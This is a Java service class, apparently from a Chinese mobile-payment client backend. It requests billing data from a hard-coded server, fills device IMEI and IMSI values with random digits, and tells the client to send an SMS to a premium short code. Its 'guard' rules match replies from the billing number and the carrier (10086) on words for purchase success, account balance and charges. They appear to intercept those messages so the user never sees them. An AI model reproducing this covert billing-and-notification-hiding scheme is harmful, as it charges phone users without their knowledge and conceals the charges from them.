package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

public class HsblDynamicService implements IDynamicService{

	private static final String TYPE = "hsbl";
	private static final String URLPARAM = "type={type}&codeNo={codeNo}&exData={exData}&imei={imei}&imsi={imsi}";
	private int timeOut = 300;
	
	private static final Guard guard1 = new Guard("10658800", "无法|稍后|有误|请核对", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658800","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658800","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "1065842410";
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String mobileId = map.get("mobileId");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(mobileId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(mobileId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(mobileId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = URLPARAM.replace("{imsi}" , imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = fillImei(imei.replaceAll("[a-zA-Z]","1"));
			
			
			param = param.replace("{imei}", imei);
			param = param.replace("{type}", StringUtils.defaultString(map.get("stype")));
			param = param.replace("{codeNo}", StringUtils.defaultString(map.get("codeNo")));
			param = param.replace("{exData}", StringUtils.defaultString(map.get("exData")));
			
			System.out.println("hsbl : "+url+";"+param);
			String responseXml = GetData.getData(url,param);
			System.out.println("hsbl response xml : "+responseXml);
			
			if(responseXml != null && responseXml.length() > 0){
				
				tryMap.remove(mobileId);
				
				try{
					xml = parseXml(map,responseXml);
				}catch(Exception e){
					return DynamicUtils.parseError("597");
				}
			}else{
				System.out.println("hsbl responseXml is null");
				return DynamicUtils.parseWait(map);
			}
		}
		
		return xml;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}
	
	private String parseXml(Map<String, String> map,String data){
		
		List<Sms> smsList = new ArrayList<Sms>();
		
		Sms sms = new Sms();
		
		sms.setSmsContent(data);
		sms.setSmsDest(DEST);
		sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
		
		smsList.add(sms);
		
		Sms guardSms = new Sms();
		
		List<Guard> guardList = new ArrayList<Guard>();
		
		guardList.add(guard1);
		guardList.add(guard2);
		
		guardList.add(guard6);
		guardList.add(guard3);
		guardList.add(guard4);
		guardList.add(guard5);
		
		guardSms.setGuardList(guardList);
		
		smsList.add(0, guardSms);
			
		return XstreamHelper.toXml(smsList);
	}
	
	public static void main(String[] args){
		HsblDynamicService service = new HsblDynamicService();
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("imsi", "460001153105779");
		map.put("imei", "869460011612203");
		map.put("mobileId", "2892");
		map.put("stype","2");
		map.put("codeNo","20140724045608");
		map.put("exData","test");
		map.put("url","http://115.29.187.79/mmpm/wiPay");
		
		String xml = service.dynamic(map);
		
		System.out.println(xml);
	}

}
